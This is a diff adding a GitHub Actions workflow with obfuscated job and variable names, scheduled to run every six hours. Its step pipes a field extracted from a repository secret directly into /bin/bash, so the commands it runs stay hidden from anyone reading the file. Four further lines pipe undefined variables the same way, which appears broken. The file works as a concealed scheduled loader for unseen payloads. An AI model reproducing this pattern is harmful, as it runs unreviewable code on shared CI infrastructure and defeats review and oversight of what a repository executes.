@@ -1,0 +1,21 @@
+name: gongshunshenweijiaxu
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '13 4/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: gongshunshenweijiaxu
+        env:
+          xd53: ${{ secrets.xd53 }}
+        run: |
+          echo $xd53 | jq -r .twagw0646 | /bin/bash
+          echo $cuntd8197 | jq -r .k8491 | /bin/bash
+          echo $s22488 | jq -r .bizs2 | /bin/bash
+          echo $pje9 | jq -r .eu9 | /bin/bash
+          echo $rumlg936 | jq -r .gpzov07 | /bin/bash
+
